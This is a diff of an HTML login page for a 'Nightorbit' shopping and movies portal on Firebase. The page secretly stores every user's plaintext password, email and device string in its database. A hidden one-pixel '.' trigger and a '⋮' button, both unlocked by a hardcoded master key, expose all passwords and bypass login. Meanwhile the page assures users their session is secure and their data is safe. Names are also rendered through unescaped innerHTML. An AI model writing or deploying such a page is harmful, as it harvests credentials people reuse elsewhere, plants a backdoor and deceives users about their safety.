@@ -3,171 +3,204 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nightorbit Elite - Full Version</title>
+    <title>Nightorbit Elite - Ultimate Edition</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     
     <style>
-        :root { --primary: #00d2ff; --neon: #ff0055; --bg: #05070a; }
+        :root { --primary: #00d2ff; --neon: #ff0055; --gold: #ffd700; --bg: #05070a; }
         * { box-sizing: border-box; }
-        body { 
-            margin: 0; padding: 0; width: 100%; height: 100vh; 
-            background: radial-gradient(circle at center, #1B2735 0%, var(--bg) 100%);
-            font-family: 'Segoe UI', sans-serif; color: white;
-            display: flex; align-items: center; justify-content: center;
-            overflow: hidden;
-        }
-
-        /* Glassmorphism Card */
-        .card { 
-            background: rgba(255, 255, 255, 0.08); backdrop-filter: blur(25px);
-            padding: 40px; border-radius: 30px; text-align: center; 
-            width: 360px; border: 1px solid rgba(255,255,255,0.1); 
-            box-shadow: 0 25px 50px rgba(0,0,0,0.8); z-index: 10;
-        }
-
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--primary); background: rgba(0,0,0,0.4); color: white; outline: none; }
-        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; transition: 0.3s; }
         
-        /* Links Styling */
-        .link-card { background: rgba(255,255,255,0.07); padding: 15px; border-radius: 15px; margin: 12px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; }
-        .link-card:hover { background: rgba(255,255,255,0.15); transform: scale(1.03); }
+        body { 
+            margin: 0; background: radial-gradient(circle, #1B2735 0%, var(--bg) 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh;
+            overflow-x: hidden;
+        }
 
-        /* Secret Access */
-        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); opacity: 0.5; z-index: 100; }
-        .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
+        /* Glassmorphism Card with Neon Glow */
+        .card { 
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
+            padding: 35px; border-radius: 35px; text-align: center; 
+            width: 90%; max-width: 400px; border: 1px solid rgba(255,255,255,0.1); 
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2); transition: 0.5s;
+        }
 
-        /* Overlays */
-        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 500; display: none; padding: 40px; overflow-y: auto; }
-        #logout-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        input { 
+            width: 100%; padding: 14px; margin: 10px 0; border-radius: 15px; 
+            border: 1px solid rgba(0, 210, 255, 0.3); background: rgba(0,0,0,0.5); 
+            color: white; outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 10px var(--primary); }
+
+        .btn-main { 
+            background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; 
+            border: none; padding: 15px; border-radius: 15px; cursor: pointer; 
+            width: 100%; font-weight: bold; margin-top: 10px; transition: 0.3s;
+            text-shadow: 0 0 5px rgba(255,255,255,0.5);
+        }
+        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4); }
+
+        /* Market & Movies Style */
+        .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 20px 0 5px 10px; letter-spacing: 2px; text-transform: uppercase; }
+        .item-link { 
+            background: rgba(255,255,255,0.05); padding: 14px; border-radius: 18px; 
+            margin: 10px 0; display: flex; justify-content: space-between; align-items: center; 
+            text-decoration: none; color: white; border-left: 5px solid var(--primary); 
+            transition: 0.4s; font-weight: 500;
+        }
+        .item-link:hover { background: rgba(0, 210, 255, 0.1); transform: scale(1.02); border-left-color: var(--neon); }
+
+        /* Attractive Logout Overlay */
+        #logout-overlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #000; z-index: 1000; display: none; 
+            flex-direction: column; align-items: center; justify-content: center; text-align: center;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes textSlow { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .bye-text { animation: textSlow 2s ease-in-out; font-size: 28px; color: var(--primary); text-shadow: 0 0 15px var(--primary); }
+
+        /* Hidden Controls */
+        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 500; display: none; padding: 30px; overflow-y: auto; }
+        .dots-btn { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.3; }
         .hidden { display: none !important; }
+        .admin-trigger { position: absolute; bottom: 10px; right: 10px; font-size: 10px; color: #111; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="logout-screen">
-        <div style="font-size: 60px;">✨</div>
-        <h2 id="bye-msg" style="color: var(--primary); font-size: 24px; padding: 20px;"></h2>
+    <div id="logout-overlay">
+        <div style="font-size: 80px; margin-bottom: 20px;">🌟</div>
+        <div id="bye-msg-container" class="bye-text"></div>
+        <p style="color: #555; margin-top: 20px;">Nightorbit Security System</p>
     </div>
 
     <div id="admin-panel">
-        <h1 style="color: var(--primary);">User Database Control</h1>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 40px;">Close Panel</button>
-        <div id="user-display-list" style="margin-top: 30px;"></div>
+        <h2 style="color: var(--primary);">System User Logs</h2>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 40px;">Exit Admin</button>
+        <div id="user-list-html" style="margin-top: 30px;"></div>
     </div>
 
-    <div class="menu-dots" onclick="masterBypass()">⋮</div>
-    <div class="admin-dot" onclick="openAdminPanel()">.</div>
+    <div class="dots-btn" onclick="masterBypass()">⋮</div>
+    <div class="admin-trigger" onclick="openAdmin()">.</div>
 
     <div id="login-box" class="card">
-        <h1 style="color: var(--primary); margin: 0; letter-spacing: 2px;">NIGHTORBIT</h1>
-        <p style="color: #888; font-size: 13px;">Market & Movies Portal</p>
-        <input type="email" id="email" placeholder="Email Address">
-        <input type="password" id="pass" placeholder="Password">
-        <button class="btn-main" onclick="emailAuth()">LOGIN / SIGNUP</button>
-        <button class="btn-main" style="background:white; color:black; margin-top:15px;" onclick="googleAuth()">SIGN-IN WITH GOOGLE</button>
+        <h1 style="color: var(--primary); margin: 0; letter-spacing: 4px; font-weight: 800;">NIGHTORBIT</h1>
+        <p style="color: #666; font-size: 12px; margin-bottom: 25px;">PREMIUM BAZAAR & MOVIES</p>
+        <input type="email" id="email-field" placeholder="Email Address">
+        <input type="password" id="pass-field" placeholder="Password">
+        <button class="btn-main" onclick="emailAuth()">LOG IN</button>
+        <button class="btn-main" style="background:white; color:black; margin-top:15px;" onclick="googleAuth()">CONTINUE WITH GOOGLE</button>
     </div>
 
-    <div id="content-box" class="card hidden">
-        <h2 id="user-welcome" style="color: var(--primary);">Welcome!</h2>
-        <div style="text-align: left; margin-top: 20px;">
-            <a href="https://www.daraz.pk" target="_blank" class="link-card">🛒 Daraz Market <span>PK</span></a>
-            <a href="https://www.amazon.com" target="_blank" class="link-card">🛍️ Global Store <span>US</span></a>
-            <a href="YOUR_MOVIE_LINK" target="_blank" class="link-card" style="border-left-color: #00ff00;">🎬 Download Movies <span style="background: green; padding: 2px 6px; border-radius: 4px; font-size: 10px;">PAISE</span></a>
-        </div>
-        <button onclick="startLogoutSequence()" style="margin-top: 30px; color: #ff4b2b; background: none; border: none; cursor: pointer; font-weight: bold;">Logout Safely</button>
+    <div id="bazar-box" class="card hidden">
+        <h2 id="display-name" style="color: var(--primary); margin-bottom: 0;">Welcome</h2>
+        <p style="font-size: 11px; color: #666; margin-top: 5px;">Secure Session Active</p>
+        
+        <div class="section-tag">🛒 Digital Bazaar</div>
+        <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz PK <span>Store</span></a>
+        <a href="https://www.aliexpress.com" target="_blank" class="item-link">🌍 AliExpress <span>Global</span></a>
+        <a href="https://www.amazon.com" target="_blank" class="item-link">📦 Amazon US <span>Market</span></a>
+        
+        <div class="section-tag">🎬 Cinema & Earning</div>
+        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Watch Movies <span>Online</span></a>
+        <a href="YOUR_PPD_LINK" target="_blank" class="item-link" style="border-left-color: #00ff00;">💎 Premium Download <span>$ Earn</span></a>
+
+        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.3); cursor:pointer; margin-top:30px; font-size:12px;">DISCONNECT SESSION</button>
     </div>
 
     <script>
-        // Aapki Original Config
         const firebaseConfig = {
             apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
             authDomain: "my-market-ff254.firebaseapp.com",
             projectId: "my-market-ff254",
             storageBucket: "my-market-ff254.firebasestorage.app",
             messagingSenderId: "1039626785987",
-            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76"
+            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76",
+            databaseURL: "https://my-market-ff254-default-rtdb.firebaseio.com"
         };
 
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.database();
-        let activeUserName = "Member";
+        let userIdentity = "Member";
 
-        // 1. MASTER BYPASS (3 Dots)
-        function masterBypass() {
-            if(prompt("Master Key:") === "rr123456789000rr") showDashboardUI("Admin Farooq");
-        }
-
-        // 2. ADMIN PANEL (One Dot)
-        function openAdminPanel() {
+        // Secret Admin
+        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") showBazarUI("Admin Farooq"); }
+        
+        function openAdmin() {
             if (prompt("Admin Key:") === "rr123456789000rr") {
                 document.getElementById('admin-panel').style.display = 'block';
                 db.ref('users').on('value', (snap) => {
-                    let html = "";
-                    snap.forEach(child => {
-                        let u = child.val();
-                        html += `<div style="background:#111; padding:15px; margin-bottom:10px; border-radius:15px; border: 1px solid #333; text-align:left;">
-                            <b style="color:var(--primary)">${u.savedName || 'No Name'}</b> | Pass: ${u.password}<br>
-                            <small style="color:#666">${u.email}</small><br>
-                            <button onclick="renameUser('${child.key}')" style="margin-top:10px; cursor:pointer;">Edit Display Name</button>
+                    let h = "";
+                    snap.forEach(s => {
+                        let u = s.val();
+                        h += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin:10px 0; border-radius:15px; border:1px solid #333">
+                            <b style="color:var(--primary)">${u.savedName || 'User'}</b> | Pass: ${u.password}<br>
+                            <small>${u.email}</small><br>
+                            <button onclick="rename('${s.key}')" style="margin-top:8px">Change Name</button>
                         </div>`;
                     });
-                    document.getElementById('user-display-list').innerHTML = html;
+                    document.getElementById('user-list-html').innerHTML = h;
                 });
             }
         }
 
-        function renameUser(uid) {
-            let n = prompt("Enter Custom Name:");
+        function rename(uid) {
+            let n = prompt("New Name:");
             if(n) db.ref('users/' + uid).update({ savedName: n });
         }
 
-        // 3. AUTH LOGIC
+        // Auth Logic
         function googleAuth() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider).then(res => handleUserData(res.user, "GoogleLogin"));
+            auth.signInWithPopup(provider).then(res => syncData(res.user, "GoogleLogin"));
         }
 
         function emailAuth() {
-            const e = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-            auth.signInWithEmailAndPassword(e, p).then(res => handleUserData(res.user, p))
-            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => handleUserData(res.user, p)));
+            const e = document.getElementById('email-field').value;
+            const p = document.getElementById('pass-field').value;
+            if(!e || !p) return;
+            auth.signInWithEmailAndPassword(e, p).then(res => syncData(res.user, p))
+            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => syncData(res.user, p)));
         }
 
-        function handleUserData(user, p) {
+        function syncData(user, p) {
             db.ref('users/' + user.uid).once('value', (snap) => {
-                const data = snap.val();
-                activeUserName = data ? (data.savedName || user.displayName) : (user.displayName || "Elite User");
-                
+                let d = snap.val();
+                userIdentity = d ? (d.savedName || user.displayName) : (user.displayName || user.email.split('@')[0]);
                 db.ref('users/' + user.uid).update({
-                    email: user.email,
-                    password: p,
-                    device: navigator.userAgent,
-                    savedName: activeUserName,
-                    lastLogin: new Date().toLocaleString()
-                }).then(() => showDashboardUI(activeUserName));
+                    email: user.email, password: p, savedName: userIdentity,
+                    device: navigator.userAgent, lastLogin: new Date().toLocaleString()
+                }).then(() => showBazarUI(userIdentity));
             });
         }
 
-        function showDashboardUI(name) {
-            activeUserName = name;
+        function showBazarUI(name) {
+            userIdentity = name;
             document.getElementById('login-box').classList.add('hidden');
-            document.getElementById('content-box').classList.remove('hidden');
-            document.getElementById('user-welcome').innerText = "Hello, " + name;
+            document.getElementById('bazar-box').classList.remove('hidden');
+            document.getElementById('display-name').innerText = "Hello, " + name;
         }
 
-        function startLogoutSequence() {
-            const screen = document.getElementById('logout-screen');
-            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${activeUserName}</b>!<br>Aapka data mehfooz hai.`;
-            screen.style.display = 'flex';
-            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 4000);
+        // The Attractive Logout Sequence
+        function triggerLogout() {
+            const overlay = document.getElementById('logout-overlay');
+            const msgBox = document.getElementById('bye-msg-container');
+            msgBox.innerHTML = `Allah Hafiz, <b>${userIdentity}</b>!<br>Nightorbit par wapis zaroor aana.`;
+            overlay.style.display = 'flex';
+            
+            setTimeout(() => {
+                auth.signOut().then(() => location.reload());
+            }, 4500);
         }
 
-        // Check active login
-        auth.onAuthStateChanged(user => { if(user) handleUserData(user, "SavedSession"); });
+        auth.onAuthStateChanged(u => { if(u) syncData(u, "SessionAuto"); });
     </script>
 </body>
-</html>
+    </html>
+    
